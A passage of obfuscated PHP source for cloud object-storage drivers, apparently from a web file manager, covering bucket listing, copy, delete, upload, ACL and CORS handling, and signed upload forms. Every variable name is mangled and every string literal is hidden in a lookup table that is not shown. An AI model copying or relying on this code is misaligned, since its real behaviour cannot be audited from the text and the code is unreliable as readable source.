($this->size($ÈÅÀÔå«) > 1024 * 1024 * 25) { return $this->fileOutImageServer($ÈÅÀÔå«, $ç‹“°÷Ü); } $ÍàèÛ¶Ğ = array($‡´Ú‹‰Ó[1403] => $‡´Ú‹‰Ó[1404] . $ç‹“°÷Ü . $‡´Ú‹‰Ó[1405]); $²°‚ò¥Û = $this->link($ÈÅÀÔå«, $ÍàèÛ¶Ğ); $this->fileOutLink($²°‚ò¥Û); } public function fileOutLink($ğşè–¬ò) { $ÌÂøÎÁê =& $_SERVER[ ÇƒŠìÀ]; if (substr($ğşè–¬ò, 0, 7) == $ÌÂøÎÁê[1366]) { $ğşè–¬ò = $ÌÂøÎÁê[1367] . substr($ğşè–¬ò, 7); } header($ÌÂøÎÁê[164] . $ğşè–¬ò); die; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($ù¶ÂÓ) { parent::__construct($ù¶ÂÓ); $this->signatureVersion($_SERVER[ ÇƒŠìÀ][233]); } public function fileOutLink($¥ÍèÏÔ) { $‡×˜¶¯Ã =& $_SERVER[ ÇƒŠìÀ]; if (substr($¥ÍèÏÔ, 0, 7) == $‡×˜¶¯Ã[1366]) { $¥ÍèÏÔ = $‡×˜¶¯Ã[1367] . substr($¥ÍèÏÔ, 7); } header($‡×˜¶¯Ã[164] . $¥ÍèÏÔ); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public $config = array(); public function __construct($ØŒ£Æü) { parent::__construct(); include_once SDK_DIR . $_SERVER[ ÇƒŠìÀ][1406]; $this->_init($ØŒ£Æü); } public function _init($ºØÎ‰Ù‰) { $¤ó°ºÖä =& $_SERVER[ ÇƒŠìÀ]; $this->config = $ºØÎ‰Ù‰; foreach ($ºØÎ‰Ù‰ as $êäßÑ­Å => $ÏŞ‹±Ú) { if (isset($this->{$êäßÑ­Å})) { $this->{$êäßÑ­Å} = $ÏŞ‹±Ú; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($¤ó°ºÖä[1407] . LNG($¤ó°ºÖä[1408])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $©Ì«˜ß =& $_SERVER[ ÇƒŠìÀ]; $¦”£Ç¯ï = new OSS\Model\CorsConfig(); $âÜÖ­÷Ä = new OSS\Model\CorsRule(); $âÜÖ­÷Ä->addAllowedOrigin($©Ì«˜ß[1409]); $âÜÖ­÷Ä->addAllowedMethod($©Ì«˜ß[1410]); $âÜÖ­÷Ä->addAllowedMethod($©Ì«˜ß[1411]); $âÜÖ­÷Ä->addAllowedMethod($©Ì«˜ß[1412]); $âÜÖ­÷Ä->addAllowedMethod($©Ì«˜ß[1413]); $âÜÖ­÷Ä->addAllowedMethod($©Ì«˜ß[163]); $âÜÖ­÷Ä->setMaxAgeSeconds(600); $âÜÖ­÷Ä->addExposeHeader($©Ì«˜ß[1414]); $âÜÖ­÷Ä->addAllowedHeader($©Ì«˜ß[1409]); $¦”£Ç¯ï->addRule($âÜÖ­÷Ä); try { $this->client->putBucketCors($this->bucket, $¦”£Ç¯ï); } catch (OSS\Core\OssException $ŠÖªåà) { return !1; } return !0; } public function getBucketCors() { $™£¶ãé› =& $_SERVER[ ÇƒŠìÀ]; $°í•ø­ = null; try { $°í•ø­ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $ÕÍËƒ‹ò) { return null; } if (!$°í•ø­ || !($Äì×ûë = $°í•ø­->getRules())) { return null; } $¤Î‚ˆÇ¶ = $Äì×ûë[0]->getAllowedOrigins(); $†ªçğ© = $Äì×ûë[0]->getAllowedMethods(); $·ÍÂ¸Õ = $Äì×ûë[0]->getMaxAgeSeconds(); $™–ì ö… = $Äì×ûë[0]->getExposeHeaders(); $µ«ÏùŒ• = $Äì×ûë[0]->getAllowedHeaders(); return array($™£¶ãé›[204] => isset($¤Î‚ˆÇ¶[0]) ? $¤Î‚ˆÇ¶[0] : $™£¶ãé›[12], $™£¶ãé›[208] => $†ªçğ©, $™£¶ãé›[1415] => $·ÍÂ¸Õ, $™£¶ãé›[1416] => isset($™–ì ö…[0]) ? $™–ì ö…[0] : $™£¶ãé›[12], $™£¶ãé›[206] => isset($µ«ÏùŒ•[0]) ? $µ«ÏùŒ•[0] : $™£¶ãé›[12]); } public function isBucketCors() { $Û¿÷…§ =& $_SERVER[ ÇƒŠìÀ]; $êãá¤äÜ = $this->getBucketCors(); if (!$êãá¤äÜ || !is_array($êãá¤äÜ)) { return !1; } if ($êãá¤äÜ[$Û¿÷…§[204]] != $Û¿÷…§[205] || $êãá¤äÜ[$Û¿÷…§[206]] != $Û¿÷…§[205]) { return !1; } $ú¡ıÊùÈ = array_map($Û¿÷…§[207], $êãá¤äÜ[$Û¿÷…§[208]]); if (!is_array($ú¡ıÊùÈ)) { $ú¡ıÊùÈ = array(); } $à²×şÏ = array($Û¿÷…§[209], $Û¿÷…§[210], $Û¿÷…§[211], $Û¿÷…§[212], $Û¿÷…§[213]); $ıä°–­Œ = array_diff($à²×şÏ, $ú¡ıÊùÈ); return empty($ıä°–­Œ); } public function mkfile($‡¾­…ıÃ, $ó À°¼î = '', $Ù»½îúé = REPEAT_RENAME) { $²ªìÛà¬ = $this->setContent($‡¾­…ıÃ, $ó À°¼î); if ($²ªìÛà¬ !== !1) { return $this->getPathOuter($‡¾­…ıÃ); } return !1; } public function mkdir($ÒÀ…£œ, $Õˆ–Î€ = REPEAT_SKIP) { if ($Õˆ–Î€ && $this->_isFolder($ÒÀ…£œ)) { return $this->getPathOuter($ÒÀ…£œ); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($ÒÀ…£œ)); } catch (OSS\Core\OssException $İšìõòÇ) { return !1; } return $this->getPathOuter($ÒÀ…£œ); } private function fileList($› ¹±¾, $Ù¶÷„× = '', $­¼ —Å» = 0) { $¦òõÒÌß =& $_SERVER[ ÇƒŠìÀ]; $› ¹±¾ = trim($› ¹±¾, $¦òõÒÌß[8]); $òğÕàª = empty($› ¹±¾) && $› ¹±¾ !== $¦òõÒÌß[214] ? $¦òõÒÌß[12] : $› ¹±¾ . $¦òõÒÌß[8]; $ÇÃ²ßŸ– = $¦òõÒÌß[12]; $Î™‘Šæ = 1000; $Ä¿æ±‘Ò = $Ÿàì®Á = array(); while (!0) { check_abort(); $³ëü²×ª = array($¦òõÒÌß[1417] => $Ù¶÷„×, $¦òõÒÌß[1418] => $òğÕàª, $¦òõÒÌß[1419] => $Î™‘Šæ, $¦òõÒÌß[1420] => $ÇÃ²ßŸ–); try { $áª¦ëêÇ = $this->client->listObjects($this->bucket, $³ëü²×ª); } catch (OSS\Core\OssException $§ãßÒí) { break; } $ÇÃ²ßŸ– = $áª¦ëêÇ->getNextMarker(); $ŠêŠ¬ÀÈ = $áª¦ëêÇ->getObjectList(); $”í¢â‘Ö = $áª¦ëêÇ->getPrefixList(); foreach ($ŠêŠ¬ÀÈ as $ç›Åê€ê) { if ($ç›Åê€ê->getKey() == $òğÕàª) { continue; } $–’ÄÈ¥— = $ç›Åê€ê->getKey(); $×­¤…Ôê = $ç›Åê€ê->getSize(); $”Œ±ßö = $ç›Åê€ê->getLastModified(); $ÀÅÌ³€å = trim($ç›Åê€ê->getETag(), $¦òõÒÌß[120]); $‰ïÆ§¦… = $­¼ —Å» ? array($¦òõÒÌß[32] => $–’ÄÈ¥—, $¦òõÒÌß[78] => $×­¤…Ôê, $¦òõÒÌß[196] => strtotime($”Œ±ßö), $¦òõÒÌß[1421] => $ÀÅÌ³€å) : $–’ÄÈ¥—; $€çŠ»Ÿ¢ = $×­¤…Ôê == 0 && substr($–’ÄÈ¥—, strlen($–’ÄÈ¥—) - 1, 1) == $¦òõÒÌß[8] ? !0 : !1; $Êİ™ëóŒ = array($¦òõÒÌß[78] => $×­¤…Ôê, $¦òõÒÌß[1422] => $×­¤…Ôê, $¦òõÒÌß[87] => strtotime($”Œ±ßö), $¦òõÒÌß[1423] => $”Œ±ßö, $¦òõÒÌß[1421] => $ÀÅÌ³€å); $this->cacheMethodInfoSet($–’ÄÈ¥—, $€çŠ»Ÿ¢, $Êİ™ëóŒ); if ($€çŠ»Ÿ¢) { $Ä¿æ±‘Ò[] = $–’ÄÈ¥—; continue; } $Ÿàì®Á[] = $‰ïÆ§¦…; } foreach ($”í¢â‘Ö as $ñàÀõ„›) { $Ä¿æ±‘Ò[] = $ñàÀõ„›->getPrefix(); $this->cacheMethodInfoSet($ñàÀõ„›->getPrefix(), !0); } if ($ÇÃ²ßŸ– === $¦òõÒÌß[12]) { break; } } $this->cacheMethodInfoSet($› ¹±¾, !0); return array($¦òõÒÌß[84] => $Ä¿æ±‘Ò, $¦òõÒÌß[85] => $Ÿàì®Á); } public function copyFile($®¥¸Î ¸, $§œëš¯—) { $‚¾é«•° = $this->size($®¥¸Î ¸); if ($‚¾é«•° < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $®¥¸Î ¸, $this->bucket, $this->pathEncode($§œëš¯—)); } catch (OSS\Core\OssException $”ˆö®¥Ç) { return !1; } return $this->getPathOuter($§œëš¯—); } $˜‘•şş = $this->multiCopyObject($®¥¸Î ¸, $§œëš¯—, $‚¾é«•°); return $˜‘•şş ? $this->getPathOuter($§œëš¯—) : !1; } private function multiCopyObject($Õ¾¸÷, $˜ë¶Šë™, $»À‚˜âä) { $éªØáÉ =& $_SERVER[ ÇƒŠìÀ]; try { $É®¹¾ = array(); if ($‰Ş¼¼¾ã = $this->hashMd5($Õ¾¸÷)) { $É®¹¾ = array(OSS\OssClient::OSS_HEADERS => array($éªØáÉ[1424] => $‰Ş¼¼¾ã)); } $º«œ”• = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($˜ë¶Šë™), $É®¹¾); $ÂÒìæ = 1; $õ‰Ìä± = 0; $½‰®‡óô = array(); $˜İâ€—° = 1024 * 1024 * 10; $Á•æ ¨Á = $this->client->generateMultiuploadParts($»À‚˜âä, $˜İâ€—°); foreach ($Á•æ ¨Á as $Ãş×çØ¦ => $ÒÅéèö) { $×ò¤ÚÀÄ = $õ‰Ìä± + (int) $ÒÅéèö[$éªØáÉ[1425]]; $ãã³ÎãÈ = (int) $ÒÅéèö[$éªØáÉ[383]] + $×ò¤ÚÀÄ - 1; $”ØóòòÛ = array($éªØáÉ[1426] => $×ò¤ÚÀÄ, $éªØáÉ[1427] => $ãã³ÎãÈ); $½‰®‡óô[] = $this->client->uploadPartCopy($this->bucket, $Õ¾¸÷, $this->bucket, $this->pathEncode($˜ë¶Šë™), $ÂÒìæ, $º«œ”•, $”ØóòòÛ); $ÂÒìæ = $ÂÒìæ + 1; } $–›ëÆüş = array(); foreach ($½‰®‡óô as $Ãş×çØ¦ => $§ÓìÈĞ) { $–›ëÆüş[] = array($éªØáÉ[1428] => $Ãş×çØ¦ + 1, $éªØáÉ[1429] => $§ÓìÈĞ); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($˜ë¶Šë™), $º«œ”•, $–›ëÆüş); } catch (OSS\Core\OssException $Òû¡î–†) { return !1; } return !0; } public function moveFile($¿†ªïÁİ, $µ–ş¡Äß) { if ($this->copyFile($¿†ªïÁİ, $µ–ş¡Äß)) { $this->remove($¿†ªïÁİ); return $this->getPathOuter($µ–ş¡Äß); } return !1; } public function delFile($äñŸŸ”ï) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($äñŸŸ”ï)); } catch (OSS\Core\OssException $Ó”Éóæ) { return !1; } return !0; } public function delFolder($ë°ƒª ¨) { $‚È™¸ =& $_SERVER[ ÇƒŠìÀ]; if (!$this->exist($ë°ƒª ¨)) { return !0; } $this->listItemCache = !1; $ıÈ²÷µ™ = $this->fileList($ë°ƒª ¨); $this->listItemCache = !0; $Û„òÉßù = trim($ë°ƒª ¨, $‚È™¸[8]) . $‚È™¸[8]; if (!empty($ë°ƒª ¨) && $ë°ƒª ¨ !== $‚È™¸[214] && !in_array($Û„òÉßù, $ıÈ²÷µ™[$‚È™¸[84]])) { $ıÈ²÷µ™[$‚È™¸[84]][] = $Û„òÉßù; } $£ïùïÓı = $this->delByBatch($ıÈ²÷µ™[$‚È™¸[85]]); if (!$£ïùïÓı) { return !1; } $£ïùïÓı = $this->delByBatch($ıÈ²÷µ™[$‚È™¸[84]]); if (!$£ïùïÓı) { return !1; } return $this->delFile($Û„òÉßù); } private function delByBatch($Í‹ßŠ) { foreach (array_chunk($Í‹ßŠ, 1000) as $ÖÚÅÙô) { try { $this->client->deleteObjects($this->bucket, $ÖÚÅÙô); } catch (OSS\Core\OssException $êœÊ°Ì) { return !1; } } return !0; } public function rename($¬´î¢ş¥, $¤øå¸§–) { return $this->renameObject($¬´î¢ş¥, $¤øå¸§–); } private function fileInfo($Ìá¿àÙæ, $¤öƒ¬Äğ = false, $İ«ëæ¡¢ = array()) { $Ó½˜Æé„ =& $_SERVER[ ÇƒŠìÀ]; $ê¸°ê¬œ = array($Ó½˜Æé„[32] => $this->pathThis($Ìá¿àÙæ), $Ó½˜Æé„[86] => $this->getPathOuter($Ìá¿àÙæ), $Ó½˜Æé„[33] => $Ó½˜Æé„[216], $Ó½˜Æé„[78] => isset($İ«ëæ¡¢[$Ó½˜Æé„[78]]) ? $İ«ëæ¡¢[$Ó½˜Æé„[78]] : 0, $Ó½˜Æé„[177] => $this->ext($Ìá¿àÙæ)); if ($¤öƒ¬Äğ) { return $ê¸°ê¬œ; } $ê¸°ê¬œ[$Ó½˜Æé„[217]] = $ê¸°ê¬œ[$Ó½˜Æé„[87]] = 0; $ê¸°ê¬œ[$Ó½˜Æé„[218]] = $ê¸°ê¬œ[$Ó½˜Æé„[219]] = !0; if (empty($İ«ëæ¡¢)) { $çó˜ÄÔ¦ = $this->objectMeta($Ìá¿àÙæ); if (!$çó˜ÄÔ¦) { return $ê¸°ê¬œ; } $İ«ëæ¡¢ = array($Ó½˜Æé„[87] => strtotime($çó˜ÄÔ¦[$Ó½˜Æé„[1423]]), $Ó½˜Æé„[78] => $çó˜ÄÔ¦[$Ó½˜Æé„[1422]] + 0, $Ó½˜Æé„[1421] => $çó˜ÄÔ¦[$Ó½˜Æé„[1421]]); } if (isset($İ«ëæ¡¢[$Ó½˜Æé„[1421]]) && $İ«ëæ¡¢[$Ó½˜Æé„[1421]]) { $ê¸°ê¬œ[$Ó½˜Æé„[221]] = trim($İ«ëæ¡¢[$Ó½˜Æé„[1421]], $Ó½˜Æé„[120]); } if (isset($İ«ëæ¡¢[$Ó½˜Æé„[78]])) { $ê¸°ê¬œ[$Ó½˜Æé„[78]] = $İ«ëæ¡¢[$Ó½˜Æé„[78]]; } if (isset($İ«ëæ¡¢[$Ó½˜Æé„[87]])) { $ê¸°ê¬œ[$Ó½˜Æé„[87]] = $İ«ëæ¡¢[$Ó½˜Æé„[87]]; } if (isset($İ«ëæ¡¢[$Ó½˜Æé„[196]]) && !trim($ê¸°ê¬œ[$Ó½˜Æé„[87]])) { $ê¸°ê¬œ[$Ó½˜Æé„[87]] = $İ«ëæ¡¢[$Ó½˜Æé„[196]]; } return $ê¸°ê¬œ; } private function folderInfo($ˆÄ¯¶º·, $„ü×ü· = false, $ŒÙ£ÄÃ‰ = array()) { $®òÉ¦·ş =& $_SERVER[ ÇƒŠìÀ]; $È‰¿±ùâ = array($®òÉ¦·ş[32] => $this->pathThis($ˆÄ¯¶º·), $®òÉ¦·ş[86] => $this->getPathOuter($®òÉ¦·ş[8] . $ˆÄ¯¶º·), $®òÉ¦·ş[33] => $®òÉ¦·ş[77]); if ($„ü×ü·) { return $È‰¿±ùâ; } $È‰¿±ùâ[$®òÉ¦·ş[217]] = $È‰¿±ùâ[$®òÉ¦·ş[87]] = 0; $È‰¿±ùâ[$®òÉ¦·ş[218]] = $È‰¿±ùâ[$®òÉ¦·ş[219]] = !0; if (empty($ŒÙ£ÄÃ‰)) { $ˆÄ¯¶º· = rtrim($ˆÄ¯¶º·, $®òÉ¦·ş[8]) . $®òÉ¦·ş[8]; $ÇÛáÁ¾° = $this->objectMeta($ˆÄ¯¶º·); if (!$ÇÛáÁ¾°) { return $È‰¿±ùâ; } $ŒÙ£ÄÃ‰ = array($®òÉ¦·ş[217] => $ÇÛáÁ¾°[$®òÉ¦·ş[546]][$®òÉ¦·ş[1430]], $®òÉ¦·ş[87] => strtotime($ÇÛáÁ¾°[$®òÉ¦·ş[1423]])); } if (isset($ŒÙ£ÄÃ‰[$®òÉ¦·ş[87]])) { $È‰¿±ùâ[$®òÉ¦·ş[87]] = $ŒÙ£ÄÃ‰[$®òÉ¦·ş[87]]; } if (isset($ŒÙ£ÄÃ‰[$®òÉ¦·ş[217]])) { $È‰¿±ùâ[$®òÉ¦·ş[217]] = $ŒÙ£ÄÃ‰[$®òÉ¦·ş[217]]; } return $È‰¿±ùâ; } public function listPath($ÈÈ–¯ƒ¬, $›ñ×çı’ = false) { $Ù¤Ëáº =& $_SERVER[ ÇƒŠìÀ]; $ãˆ—ğ€¿ = $this->fileList($ÈÈ–¯ƒ¬, $Ù¤Ëáº[8], !0); foreach ($ãˆ—ğ€¿[$Ù¤Ëáº[84]] as $ÉµüËİõ => $ß©¶ö»…) { $ãˆ—ğ€¿[$Ù¤Ëáº[84]][$ÉµüËİõ] = $this->folderInfo($ß©¶ö»…, $›ñ×çı’, $ß©¶ö»…); } foreach ($ãˆ—ğ€¿[$Ù¤Ëáº[85]] as $ÉµüËİõ => $ß©¶ö»…) { $ãˆ—ğ€¿[$Ù¤Ëáº[85]][$ÉµüËİõ] = $this->fileInfo($ß©¶ö»…[$Ù¤Ëáº[32]], $›ñ×çı’, $ß©¶ö»…); } return $ãˆ—ğ€¿; } protected function infoChildren($İ…İ‘Ü, &$–ù¼Çóµ) { $»”µŞ·” =& $_SERVER[ ÇƒŠìÀ]; $’Ğú…Áê = $this->fileList($İ…İ‘Ü, $»”µŞ·”[12], !0); $–ù¼Çóµ[$»”µŞ·”[80]] += count($’Ğú…Áê[$»”µŞ·”[84]]); $–ù¼Çóµ[$»”µŞ·”[79]] += count($’Ğú…Áê[$»”µŞ·”[85]]); foreach ($’Ğú…Áê[$»”µŞ·”[85]] as $»‚¬Å¥ò) { if (!$»‚¬Å¥ò || !$»‚¬Å¥ò[$»”µŞ·”[78]]) { continue; } $–ù¼Çóµ[$»”µŞ·”[78]] += $»‚¬Å¥ò[$»”µŞ·”[78]]; } } public function has($ÇÊ‰ô€¡, $â†÷µ­Š = false, $´ñÔ¬ü = true) { $Ààó¸º’ =& $_SERVER[ ÇƒŠìÀ]; $ÇÊ‰ô€¡ = trim($ÇÊ‰ô€¡, $Ààó¸º’[8]); $É«ÕæÉ = empty($ÇÊ‰ô€¡) && $ÇÊ‰ô€¡ !== $Ààó¸º’[214] ? $Ààó¸º’[12] : $ÇÊ‰ô€¡ . $Ààó¸º’[8]; $†µŸ¨Ö‘ = $Ààó¸º’[12]; $ì²ÛÒË» = 500; $»Òûåïé = $Ê“•ÕµÜ = 0; while (!0) { check_abort(); $¢Å¾ã“Û = array($Ààó¸º’[1417] => $Ààó¸º’[8], $Ààó¸º’[1418] => $É«ÕæÉ, $Ààó¸º’[1419] => $ì²ÛÒË», $Ààó¸º’[1420] => $†µŸ¨Ö‘); try { $€ÉÒİëá = $this->client->listObjects($this->bucket, $¢Å¾ã“Û); } catch (OSS\Core\OssException $®Ö»Ê¯³) { break; } $†µŸ¨Ö‘ = $€ÉÒİëá->getNextMarker(); $ŞÅí©ó = $€ÉÒİëá->getObjectList(); $ÌÂ£ôòÜ = $€ÉÒİëá->getPrefixList(); if ($â†÷µ­Š) { if (count($ŞÅí©ó) > 1 || count($ŞÅí©ó) == 1 && $ŞÅí©ó[0]->getKey() != $É«ÕæÉ) { $»Òûåïé += count($ŞÅí©ó) - 1; } if (!empty($ÌÂ£ôòÜ)) { $Ê“•ÕµÜ += count($ÌÂ£ôòÜ); } if ($†µŸ¨Ö‘ === $Ààó¸º’[12]) { break; } continue; } if ($´ñÔ¬ü) { if (!empty($ŞÅí©ó)) { if (count($ŞÅí©ó) > 1 || $ŞÅí©ó[0]->getKey() != $É«ÕæÉ) { return !0; } } } else { if (!empty($ÌÂ£ôòÜ)) { return !0; } } if ($†µŸ¨Ö‘ === $Ààó¸º’[12]) { break; } } if ($â†÷µ­Š) { return array($Ààó¸º’[225] => $»Òûåïé, $Ààó¸º’[226] => $Ê“•ÕµÜ); } return !1; } public function listAll($”ÍÜ²Ù) { $Ëï¬º§ƒ =& $_SERVER[ ÇƒŠìÀ]; $ÓÒõ­ˆ§ = $this->fileList($”ÍÜ²Ù, $Ëï¬º§ƒ[12], !0); $½ Ü¨İµ = array_to_keyvalue($ÓÒõ­ˆ§[$Ëï¬º§ƒ[85]], $Ëï¬º§ƒ[32]); foreach ($ÓÒõ­ˆ§[$Ëï¬º§ƒ[84]] as $¥œáâÈ¿) { if (is_string($¥œáâÈ¿)) { $½ Ü¨İµ[$¥œáâÈ¿] = array($Ëï¬º§ƒ[78] => 0); } } return $this->listAllFiles($”ÍÜ²Ù, $½ Ü¨İµ); } public function canRead($Ëô½§Û) { $¡¬çÕÆ† =& $_SERVER[ ÇƒŠìÀ]; $–¨Ä¥ÂŸ = $this->pathAcl($Ëô½§Û); return $–¨Ä¥ÂŸ == $¡¬çÕÆ†[1431] || $–¨Ä¥ÂŸ == $¡¬çÕÆ†[589] ? !0 : !1; } public function canWrite($¡Ä–øæÒ) { $ŠŸÊØŒ = $this->pathAcl($¡Ä–øæÒ); return $ŠŸÊØŒ == $_SERVER[ ÇƒŠìÀ][589] ? !0 : !1; } public function pathAcl($ßíòÖ›ƒ) { $Àğßëõñ =& $_SERVER[ ÇƒŠìÀ]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $ú¹°ïïó = $this->client->getObjectAcl($this->bucket, $this->pathEncode($ßíòÖ›ƒ)); } catch (OSS\Core\OssException $„ïéÖØ) { return !1; } $–·èÇ¦ = $ú¹°ïïó == $Àğßëõñ[37] ? $this->bucketAcl : $ú¹°ïïó; if ($–·èÇ¦ == $Àğßëõñ[1432]) { return $Àğßëõñ[1431]; } if ($–·èÇ¦ == $Àğßëõñ[1433]) { return $Àğßëõñ[589]; } return $–·èÇ¦; } private function chmodPath($™ËÑ´ğü, $ç§¦Şšì = '') { $İ”˜ØÚÄ =& $_SERVER[ ÇƒŠìÀ]; $¢¦çÒ—½ = empty($ç§¦Şšì) ? $İ”˜ØÚÄ[1433] : $ç§¦Şšì; $æÄ°³Ëé = array($İ”˜ØÚÄ[37], $İ”˜ØÚÄ[215], $İ”˜ØÚÄ[1432], $İ”˜ØÚÄ[1433]); if (!in_array($¢¦çÒ—½, $æÄ°³Ëé)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($™ËÑ´ğü), $¢¦çÒ—½); } catch (OSS\Core\OssException $µŞª’“) { return !1; } return !0; } public function getContent($ã¥âÆÙº) { return $this->fileSubstr($ã¥âÆÙº, -1); } public function setContent($½ÉñÜ¥Û, $ñ…ù™îã = '') { $‚úè‚¹› =& $_SERVER[ ÇƒŠìÀ]; try { $»‡¥‰Ñ¡ = $this->trafficLimit($‚úè‚¹›[1434]); $´ì¸ğÈ¼ = $this->client->putObject($this->bucket, $this->pathEncode($½ÉñÜ¥Û), $ñ…ù™îã, $»‡¥‰Ñ¡); } catch (OSS\Core\OssException $½ÇÚóŒ) { return !1; } $ñÊ²İ‚é = array($‚úè‚¹›[1424] => trim($´ì¸ğÈ¼[$‚úè‚¹›[1421]], $‚úè‚¹›[120]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($½ÉñÜ¥Û))); $this->updateObjMeta($½ÉñÜ¥Û, $ñÊ²İ‚é); return isset($´ì¸ğÈ¼[$‚úè‚¹›[1435]][$‚úè‚¹›[277]]) ? !0 : !1; } private function updateObjMeta($ç¶Òïç–, $ß’²ı¬Ë) { $ç¶Òïç– = $this->pathEncode($ç¶Òïç–); try { $ôî¦„¶ = array(OSS\OssClient::OSS_HEADERS => $ß’²ı¬Ë); $this->client->copyObject($this->bucket, $ç¶Òïç–, $this->bucket, $ç¶Òïç–, $ôî¦„¶); } catch (OSS\Core\OssException $•¬ƒĞš) { return !1; } return !0; } public function upload($‚æğñ…‡, $–æúüóş, $–òáİ¤ = false, $¶ï—ãå = REPEAT_REPLACE) { $¼‰ıÄ¯¢ =& $_SERVER[ ÇƒŠìÀ]; $¢´æû©ü = trim($‚æğñ…‡, $¼‰ıÄ¯¢[8]); $Í¢ˆõ½ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($¼‰ıÄ¯¢[1424] => @md5_file($–æúüóş)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($‚æğñ…‡))); $Í¢ˆõ½ = $this->trafficLimit($¼‰ıÄ¯¢[1434], $Í¢ˆõ½); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($¢´æû©ü), $–æúüóş, $Í¢ˆõ½); } catch (OSS\Core\OssException $šƒ»ñ¶) { return !1; } return $this->getPathOuter($‚æğñ…‡); } public function getHost() { $ïÎ¦…ë =& $_SERVER[ ÇƒŠìÀ]; $ºÁ‹ÁÈ« = explode($ïÎ¦…ë[200], parent::getHost()); return $ºÁ‹ÁÈ«[0] . $ïÎ¦…ë[200] . $this->bucket . $ïÎ¦…ë[10] . $ºÁ‹ÁÈ«[1]; } public function uploadFormData($ËÅû¥¾‰, $øúªÅ°ˆ = 3600) { $ÒÍæÉù =& $_SERVER[ ÇƒŠìÀ]; if (!($Ü»á¹”“ = $this->getHost())) { return !1; } $˜¡ÑÆ®š = $øúªÅ°ˆ; $¿›¬³¢ú = date($ÒÍæÉù[1436], time() + $˜¡ÑÆ®š); $¦„‰¨‘Ş = new DateTime($¿›¬³¢ú); $Ñì¡Å¤  = $¦„‰¨‘Ş->format(DateTime::ISO8601); $´¢ÃÁåÀ = strpos($Ñì¡Å¤ , $ÒÍæÉù[342]); $Ñì¡Å¤  = substr($Ñì¡Å¤ , 0, $´¢ÃÁåÀ) . $ÒÍæÉù[1437]; $èàŒÊƒÆ = 1048576000 * 5; $à—Ñ¥¹¸ = $this->pathFather($ËÅû¥¾‰); $û¨ŸÍçò = array($ÒÍæÉù[260] => $Ñì¡Å¤ , $ÒÍæÉù[263] => array(array($ÒÍæÉù[1438], 0, $èàŒÊƒÆ), array($ÒÍæÉù[266], $ÒÍæÉù[267], $à—Ñ¥¹¸))); $ëµƒËö½ = base64_encode(json_encode($û¨ŸÍçò)); $œÇË°¥ = base64_encode(hash_hmac($ÒÍæÉù[249], $ëµƒËö½, $this->secret, !0)); $ÓŞÅ›‚ß = array($ÒÍæÉù[278] => $ëµƒËö½, $ÒÍæÉù[1439] => $this->accessKey, $ÒÍæÉù[270] => $ÒÍæÉù[259], $ÒÍæÉù[1440] => $œÇË°¥, $ÒÍæÉù[198] => $Ü»á¹”“); $ÓŞÅ›‚ß = $this->trafficLimit($ÒÍæÉù[1434], $ÓŞÅ›‚ß); return $ÓŞÅ›‚ß; } public function multiUploadFormData($“”Û¶Ù, $êúë‚İ¼ = 3600) { $´€à´ÊÀ =& $_SERVER[ ÇƒŠìÀ]; if (!($ÍÔŞÆøŒ = $this->getHost())) { return !1; } $–ìŞšˆ‘ = $this->trafficLimit($´€à´ÊÀ[1434]); $àõ’Íã = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($“”Û¶Ù), $–ìŞšˆ‘); return array($´€à´ÊÀ[240] => $àõ’Íã, $´€à´ÊÀ[198] => $ÍÔŞÆøŒ . $´€à´ÊÀ[8] . $this->pathEncode($“”Û¶Ù), $´€à´ÊÀ[241] => gmdate($´€à´ÊÀ[1441]), $´€à´ÊÀ[96] => $“”Û¶Ù); } public function multiUploadAuthData($¢’Ï×¼Ô, $¢ışŞĞ‡ = array()) { $ºäÚ£´Ã =& $_SERVER[ ÇƒŠìÀ]; $‚Œ­Éä” = isset($¢ışŞĞ‡[$ºäÚ£´Ã[241]]) ? $¢ışŞĞ‡[$ºäÚ£´Ã[241]] : gmdate($ºäÚ£´Ã[1441]); $Ê¦çÀë‰ = isset($¢ışŞĞ‡[$ºäÚ£´Ã[177]]) ? $¢ışŞĞ‡[$ºäÚ£´Ã[177]] : $ºäÚ£´Ã[12]; $áËŠ¹‰° = $¢’Ï×¼Ô; if (isset($¢ışŞĞ‡[$ºäÚ£´Ã[96]])) { $áËŠ¹‰° = $¢ışŞĞ‡[$ºäÚ£´Ã[96]]; unset($¢ışŞĞ‡[$ºäÚ£´Ã[96]]); } if (isset($¢ışŞĞ‡[$ºäÚ£´Ã[242]])) { $¢ışŞĞ‡[$ºäÚ£´Ã[241]] = $‚Œ­Éä”; return $this->listUploadParts($áËŠ¹‰°, $¢ışŞĞ‡); } $¶äÔÈ ¼ = array($ºäÚ£´Ã[243], $ºäÚ£´Ã[12], $ºäÚ£´Ã[122], $‚Œ­Éä”, "\x78\55\157\163\163\55\144\141\x74\145\72{$‚Œ­Éä”}", $ºäÚ£´Ã[8] . $this->bucket . $ºäÚ£´Ã[8] . $áËŠ¹‰° . $Ê¦çÀë‰); if (strpos($Ê¦çÀë‰, $ºäÚ£´Ã[244]) === 0) { $¶äÔÈ ¼[0] = $ºäÚ£´Ã[245]; if ($×ˆÚ£İ„ = $this->trafficLimit($ºäÚ£´Ã[1434])) { $áËŠ¹‰° = 